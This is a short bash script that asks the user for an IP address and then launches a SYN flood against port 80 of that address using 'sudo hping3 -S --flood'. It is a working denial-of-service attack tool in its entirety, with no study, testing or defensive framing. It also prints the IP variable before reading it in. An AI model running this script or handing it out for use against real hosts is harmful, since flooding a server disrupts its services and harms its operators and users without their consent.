#!/bin/bash

echo "Enter the ip address:$ip "
ip=$ip
read ip
sudo hping3 -S --flood -V -p 80   $ip
echo "Finished!"
